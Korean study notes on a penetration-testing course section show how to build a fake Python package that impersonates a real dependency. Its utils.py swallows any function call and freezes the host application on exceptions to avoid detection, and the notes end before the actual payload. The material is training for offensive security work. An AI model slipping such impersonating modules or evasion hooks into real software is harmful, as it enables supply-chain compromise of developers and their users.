# 26.9.4 런타임 명령 실행

> **Command Execution During Runtime** · PEN-200 §26.9.4

런타임 실행은 **개발자가 패키지를 실제로 쓰는 방식에 맞춰야** 성립함. 포럼 글에서 확인된 사용법은 이것임.

```
from hackshort_util import utils
```

*애플리케이션이 `hackshort_util` 에서 `utils` 서브모듈을 가져감*

따라서 `hackshort_util` 디렉터리에 `utils.py` 가 없으면 임포트 단계에서 오류가 남. 그런데 그 서브모듈에 **어떤 함수가 있는지는 모름** — 애플리케이션이 호출하는 순간 또 오류가 남. 게다가 함수가 값을 반환하는 자리라면 우리가 돌려준 값이 안 맞아 세 번째 오류가 남.

세 문제를 각각 막는 구성임.

```
kali@kali:~/hackshort-util$ nano hackshort_util/utils.py
kali@kali:~/hackshort-util$ cat -n hackshort_util/utils.py
01  import time
02  import sys
03
04  def standardFunction():
05          pass
06
07  def __getattr__(name):
08          pass
09          return standardFunction
10
11  def catch_exception(exc_type, exc_value, tb):
12      while True:
13          time.sleep(1000)
14
15  sys.excepthook = catch_exception
```

*이름을 모르는 호출을 전부 삼키고, 그래도 난 예외는 후크로 잡아 실행을 멈춤*

- `standardFunction()` — 호출을 받아 `pass` 로 아무 일도 안 하고 넘김
- `__getattr__(name)` — **존재하지 않는 이름을 참조할 때 호출되는 특수 함수**. 여기서 `standardFunction` 을 돌려주므로 어떤 함수명으로 불러도 걸리는 와일드카드가 됨
- `sys.excepthook = catch_exception` — 그래도 예외가 나면 후크가 받아 1000초 `sleep` 무한 루프로 **실행을 정지시킴**. ⚠️ 사용자 쪽에서는 애플리케이션이 멈춘 것처럼 보이나, 예외로 죽어 흔적을 남기는 것보다 낫고 그동안 환경 정찰 시간을 벌 수 있음

반영은 제거 → 재빌드 → 재설치 3단으로 함.

```
kali@kali:~/hackshort-util$ pip uninstall hackshort-util
...
kali@kali:~/hackshort-util$ python3 ./setup.py sdist
...
kali@kali:~/hackshort-util$ pip install ./dist/hackshort_util-1.1.4.tar.gz
...
```

*제거·재빌드·재설치 — 출력은 앞서 본 것과 같아 교재가 `...` 로 줄임*

> ⚠️ **교재 표기 주의** — 여기서는 설치 파일명을 `hackshort_util-1.1.4.tar.gz`(밑줄)로 적으나 앞 절의 `sdist` 출력은 `hackshort-util-1.1.4`(대시)로 아카이브를 만듦. `dist/` 안의 실제 파일명을 보고 칠 것. `[가정]` setuptools 버전에 따라 이름 정규화가 달라 둘 다 나올 수 있음.

동작 확인은 파이썬에서 직접 함 — 아무 함수나 불러도 오류가 없고, 일부러 0 으로 나누면 무한 루프에 걸려 프롬프트가 안 돌아오는 것이 기대 동작임.

```
kali@kali:~$ python3
Python 3.11.2 [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from hackshort_util import utils
>>> utils.run()
>>> 1/0
```

*임의 함수 호출은 통과, `1/0` 은 후크에 잡혀 반환되지 않음*

토대가 잡혔으므로 이제 실제 페이로드를 얹을 차례임.
